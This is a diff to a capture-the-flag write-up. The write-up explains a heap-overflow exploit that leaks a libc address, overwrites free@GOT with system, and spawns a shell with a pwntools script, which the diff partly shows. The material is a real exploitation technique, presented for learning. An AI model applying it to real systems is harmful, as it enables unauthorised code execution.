@@ -191,11 +191,11 @@ This binary only has Partial RELRO, meaning we can overwrite addresses in the Gl
 
 * If we overwrite `free@GOT` to point to `system@LIBC` then call `deletePerson` on a `Person` whose name holds `"/bin/sh"`, we will effectively call `system("/bin/sh")`!
 
-* The address to `free@GOT` is always the same. The address to `system@LIBC` is however not, because of ASLR. 
+* The address to `free@GOT` is always the same. The address to libc addresses is however not, because of ASLR. 
 
 **So how do we get the adrress to system@LIBC?**
 
-**Easy**: The offset between `free@LIBC` and `system@LIBC` is always the same. We can overwrite P[2]->name with a ptr to `free@GOT`, and then call `printPerson` on P[2]. This will cause `free@LIBC` to be printed to us!
+**Easy**: The *offset* between `free@LIBC` and `system@LIBC` is always the same. We can overwrite P[2]->name with a ptr to `free@GOT`, and then call `printPerson` on P[2]. This will cause `free@LIBC` to be printed to us!
 
 ### Battle plan:
 * Create 4 Persons:
@@ -272,10 +272,12 @@ with context.quiet:
     add(0x16, "CCCC", 3) 
     add(0x16, "/bin/sh\0", 4) 
 
-    #Overflow and overwrite P[2]->name ("CCCC\n") with free@GOT
+    #Overflow and overwrite P[2]->name 
+    #(which points to an address containing "CCCC\n")
+    #with free@GOT
     edit(1, 
          0x30, 
-         "B"*0x20 + p32(printPerson) + p32(free_GOT), 
+         "B"*0x20 + p32(printPerson)+p32(free_GOT), 
          2)
 
     #Leak free@LIBC
@@ -291,19 +293,13 @@ with context.quiet:
 
     #Overwrite free@GOT's ptr to free@LIBC
     #with system@LIBC
-    edit(2, 0x16, p32(system_LIBC), 3)
+    edit(2, 0x4, p32(system_LIBC), 3)
 
-    gdb.attach(p, '''
-            b system
-            c
-            ''')
     #Execute system("/bin/sh")
     remove(3)
 
     p.sendline("cat flag.txt")
     p.interactive()
-
-
 ```
 
 ```
